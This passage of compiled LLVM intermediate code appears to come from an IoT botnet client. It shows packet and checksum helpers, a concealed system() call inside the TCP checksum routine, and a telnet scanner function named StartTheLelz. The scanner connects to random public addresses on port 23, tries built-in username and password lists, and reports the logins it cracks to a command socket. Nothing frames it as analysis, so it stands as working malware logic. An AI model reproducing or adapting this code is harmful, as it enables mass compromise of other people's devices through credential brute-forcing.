  %35 = srem i32 %2, 255
  %36 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %36, i8 0, i64 16, i32 16, i1 false)
  %37 = and i32 %35, 255
  %38 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %36, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i64 0, i64 0), i32 %37, i32 %9, i32 %16, i32 %18)
  %39 = call i32 @inet_addr(i8* nonnull %36) #3
  ret i32 %39
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !16

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !17

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %8 = tail call noalias i8* @malloc(i64 44) #3
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  %15 = tail call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i64 0, i64 0)) #3
  tail call void @free(i8* %8) #3
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @StartTheLelz() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %2 to %struct.timeval*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca <2 x i64>, align 16
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph165.preheader, label %._crit_edge

.lr.ph165.preheader:                              ; preds = %0
  br label %.lr.ph165

.lr.ph165:                                        ; preds = %.lr.ph165.preheader, %.lr.ph165
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph165 ], [ 0, %.lr.ph165.preheader ]
  %23 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %23, align 1
  %24 = tail call noalias i8* @malloc(i64 1024) #3
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %24, i8** %25, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %26 = icmp slt i64 %indvars.iv.next, %20
  br i1 %26, label %.lr.ph165, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph165
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  store <2 x i64> <i64 5, i64 0>, <2 x i64>* %6, align 16
  %27 = bitcast <2 x i64>* %6 to i8*
  %28 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %22, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %30 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %31 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %377, %.lr.ph.preheader
  %.1163 = phi i32 [ %.mux, %377 ], [ 0, %.lr.ph.preheader ]
  %32 = sext i32 %.1163 to i64
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 2
  %35 = load i8, i8* %34, align 8
  switch i8 %35, label %377 [
    i8 0, label %36
    i8 1, label %86
    i8 2, label %134
    i8 3, label %168
    i8 4, label %191
    i8 5, label %245
    i8 6, label %268
    i8 7, label %312
    i8 8, label %322
  ]

; <label>:36:                                     ; preds = %.lr.ph
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %38 = load i8*, i8** %37, align 8
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 1024, i32 1, i1 false)
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  %40 = load i8, i8* %39, align 1
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %48, label %42

; <label>:42:                                     ; preds = %36
  %43 = bitcast i8** %37 to i64*
  %44 = load i64, i64* %43, align 8
  %45 = bitcast %struct.telstate_t* %33 to i8*
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 32, i32 16, i1 false)
  store i64 %44, i64* %43, align 8
  %46 = call i32 @getRandomPublicIP()
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  store i32 %46, i32* %47, align 4
  br label %61

; <label>:48:                                     ; preds = %36
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %50 = load i8, i8* %49, align 1
  %51 = add i8 %50, 1
  store i8 %51, i8* %49, align 1
  %52 = icmp eq i8 %51, 26
  br i1 %52, label %53, label %._crit_edge166

._crit_edge166:                                   ; preds = %48
  %.phi.trans.insert = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %.pre = load i8, i8* %.phi.trans.insert, align 2
  br label %57

; <label>:53:                                     ; preds = %48
  store i8 0, i8* %49, align 1
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %55 = load i8, i8* %54, align 2
  %56 = add i8 %55, 1
  store i8 %56, i8* %54, align 2
  br label %57

; <label>:57:                                     ; preds = %._crit_edge166, %53
  %58 = phi i8 [ %.pre, %._crit_edge166 ], [ %56, %53 ]
  %59 = icmp eq i8 %58, 19
  br i1 %59, label %60, label %._crit_edge167

._crit_edge167:                                   ; preds = %57
  %.phi.trans.insert168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %.pre169 = load i32, i32* %.phi.trans.insert168, align 4
  br label %61

; <label>:60:                                     ; preds = %57
  store i8 1, i8* %39, align 1
  br label %377

; <label>:61:                                     ; preds = %._crit_edge167, %42
  %62 = phi i32 [ %.pre169, %._crit_edge167 ], [ %46, %42 ]
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  store i32 %62, i32* %29, align 4
  %63 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  store i32 %63, i32* %64, align 16
  %65 = call i32 @setsockopt(i32 %63, i32 1, i32 20, i8* nonnull %27, i32 16) #3
  %66 = load i32, i32* %64, align 16
  %67 = call i32 @setsockopt(i32 %66, i32 1, i32 21, i8* nonnull %27, i32 16) #3
  %68 = load i32, i32* %64, align 16
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %377, label %70

; <label>:70:                                     ; preds = %61
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %68, i32 3, i8* null) #3
  %72 = or i32 %71, 2048
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %68, i32 4, i32 %72) #3
  %74 = load i32, i32* %64, align 16
  %75 = call i32 @connect(i32 %74, %struct.sockaddr* nonnull %30, i32 16) #3
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %84

; <label>:77:                                     ; preds = %70
  %78 = tail call i32* @__errno_location() #18
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %84, label %81

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %64, align 16
  %83 = call i32 @sclose(i32 %82)
  store i8 1, i8* %39, align 1
  br label %377

; <label>:84:                                     ; preds = %77, %70
  store i8 1, i8* %34, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  store i32 0, i32* %85, align 4
  br label %377

; <label>:86:                                     ; preds = %.lr.ph
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %92

; <label>:90:                                     ; preds = %86
  %91 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %91, i32* %87, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %90
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %28) #3, !srcloc !19
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %95 = load i32, i32* %94, align 16
  %96 = srem i32 %95, 64
  %97 = zext i32 %96 to i64
  %98 = shl i64 1, %97
  %99 = sdiv i32 %95, 64
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %100
  %102 = load i64, i64* %101, align 8
  %103 = or i64 %98, %102
  store i64 %103, i64* %101, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %2, align 16
  %104 = add nsw i32 %95, 1
  %105 = call i32 @select(i32 %104, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %105, label %125 [
    i32 1, label %106
    i32 -1, label %121
  ]

; <label>:106:                                    ; preds = %92
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %107 = load i32, i32* %94, align 16
  %108 = call i32 @getsockopt(i32 %107, i32 1, i32 4, i8* nonnull %31, i32* nonnull %3) #3
  %109 = load i32, i32* %4, align 4
  %110 = icmp eq i32 %109, 0
  %111 = load i32, i32* %94, align 16
  br i1 %110, label %114, label %112

; <label>:112:                                    ; preds = %106
  %113 = call i32 @sclose(i32 %111)
  br label %.sink.split

; <label>:114:                                    ; preds = %106
  %115 = call i32 (i32, i32, ...) @fcntl(i32 %111, i32 3, i8* null) #3
  %116 = and i32 %115, -2049
  %117 = call i32 (i32, i32, ...) @fcntl(i32 %111, i32 4, i32 %116) #3
  store i32 0, i32* %87, align 4
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  store i16 0, i16* %118, align 16
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %120 = load i8*, i8** %119, align 8
  call void @llvm.memset.p0i8.i64(i8* %120, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %34, align 8
  br label %377

; <label>:121:                                    ; preds = %92
  %122 = load i32, i32* %94, align 16
  %123 = call i32 @sclose(i32 %122)
  br label %.sink.split

.sink.split:                                      ; preds = %112, %121
  store i8 0, i8* %34, align 8
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %124, align 1
  br label %125

; <label>:125:                                    ; preds = %92, %.sink.split
  %126 = load i32, i32* %87, align 4
  %127 = add i32 %126, 5
  %128 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %129 = icmp ult i32 %127, %128
  br i1 %129, label %130, label %377

; <label>:130:                                    ; preds = %125
  %131 = load i32, i32* %94, align 16
  %132 = call i32 @sclose(i32 %131)
  store i8 0, i8* %34, align 8
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %133, align 1
  br label %377

; <label>:134:                                    ; preds = %.lr.ph
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %136 = load i32, i32* %135, align 4
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %140

; <label>:138:                                    ; preds = %134
  %139 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %139, i32* %135, align 4
  br label %140

; <label>:140:                                    ; preds = %138, %134
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @matchPrompt(i8* %142)
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %146, label %145

; <label>:145:                                    ; preds = %140
  store i8 7, i8* %34, align 8
  br label %146

; <label>:146:                                    ; preds = %140, %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %148 = load i32, i32* %147, align 16
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %150 = load i16, i16* %149, align 16
  %151 = zext i16 %150 to i32
  %152 = call i32 @readUntil(i32 %148, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %142, i32 1024, i32 %151)
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %156, label %154

; <label>:154:                                    ; preds = %146
  store i32 0, i32* %135, align 4
  store i16 0, i16* %149, align 16
  %155 = load i8*, i8** %141, align 8
  call void @llvm.memset.p0i8.i64(i8* %155, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %34, align 8
  br label %377

; <label>:156:                                    ; preds = %146
  %157 = load i8*, i8** %141, align 8
  %158 = call i64 @strlen(i8* %157) #15
  %159 = trunc i64 %158 to i16
  store i16 %159, i16* %149, align 16
  %160 = load i32, i32* %135, align 4
  %161 = add i32 %160, 30
  %162 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %163 = icmp ult i32 %161, %162
  br i1 %163, label %164, label %377

; <label>:164:                                    ; preds = %156
  %165 = load i32, i32* %147, align 16
  %166 = call i32 @sclose(i32 %165)
  store i8 0, i8* %34, align 8
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %167, align 1
  br label %377

; <label>:168:                                    ; preds = %.lr.ph
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %170 = load i32, i32* %169, align 16
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %172 = load i8, i8* %171, align 2
  %173 = zext i8 %172 to i64
  %174 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %173
  %175 = load i8*, i8** %174, align 8
  %176 = call i64 @strlen(i8* %175) #15
  %177 = call i64 @send(i32 %170, i8* %175, i64 %176, i32 16384) #3
  %178 = icmp slt i64 %177, 0
  %179 = load i32, i32* %169, align 16
  br i1 %178, label %180, label %183

; <label>:180:                                    ; preds = %168
  %181 = call i32 @sclose(i32 %179)
  store i8 0, i8* %34, align 8
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %182, align 1
  br label %377

; <label>:183:                                    ; preds = %168
  %184 = call i64 @send(i32 %179, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64 2, i32 16384) #3
  %185 = icmp slt i64 %184, 0
  br i1 %185, label %186, label %190

; <label>:186:                                    ; preds = %183
  %187 = load i32, i32* %169, align 16
  %188 = call i32 @sclose(i32 %187)
  store i8 0, i8* %34, align 8
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %189, align 1
  br label %377

; <label>:190:                                    ; preds = %183
  store i8 4, i8* %34, align 8
  br label %377

; <label>:191:                                    ; preds = %.lr.ph
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %193 = load i32, i32* %192, align 4
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %195, label %197

; <label>:195:                                    ; preds = %191
  %196 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %196, i32* %192, align 4
  br label %197

; <label>:197:                                    ; preds = %195, %191
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %201 = load i8*, i8** %200, align 8
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %203 = load i16, i16* %202, align 16
  %204 = zext i16 %203 to i32
  %205 = call i32 @readUntil(i32 %199, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %201, i32 1024, i32 %204)
  %206 = icmp eq i32 %205, 0
  br i1 %206, label %226, label %207

; <label>:207:                                    ; preds = %197
  %208 = load i32, i32* @mainCommSock, align 4
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = call i8* @inet_ntoa(i32 %210) #3
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %213 = load i8, i8* %212, align 2
  %214 = zext i8 %213 to i64
  %215 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %214
  %216 = load i8*, i8** %215, align 8
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i64
  %220 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %219
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 (i32, i8*, ...) @sockprintf(i32 %208, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.77, i64 0, i64 0), i8* %211, i8* %216, i8* %221)
  store i32 0, i32* %192, align 4
  store i16 0, i16* %202, align 16
  %223 = load i8*, i8** %200, align 8
  %224 = call i8* @strstr(i8* %223, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0)) #15
  %225 = icmp ne i8* %224, null
  %.sink = select i1 %225, i8 5, i8 7
  store i8 %.sink, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %223, i8 0, i64 1024, i32 1, i1 false)
  br label %377

; <label>:226:                                    ; preds = %197
  %227 = load i8*, i8** %200, align 8
  %228 = call i8* @strstr(i8* %227, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #15
  %229 = icmp eq i8* %228, null
  br i1 %229, label %234, label %230

; <label>:230:                                    ; preds = %226
  %231 = load i32, i32* %198, align 16
